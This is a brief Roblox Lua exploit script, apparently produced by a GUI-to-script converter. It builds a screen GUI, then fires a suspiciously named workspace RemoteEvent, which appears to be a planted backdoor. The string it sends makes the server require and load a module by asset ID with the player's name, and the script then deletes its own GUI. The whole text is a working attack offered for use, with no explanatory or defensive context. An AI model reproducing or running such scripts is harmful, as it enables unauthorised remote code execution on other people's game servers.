-- Instances:

local ScreenGui = Instance.new("ScreenGui")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Scripts:

local function WTBITG_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	game.workspace.key11111111111111111111111.Remote:FireServer("require(96524732917744).load(".."'"..game.Players.LocalPlayer.Name.."'"..")", "hi", "invis")
	script.Parent:Destroy()
end
coroutine.wrap(WTBITG_fake_script)()
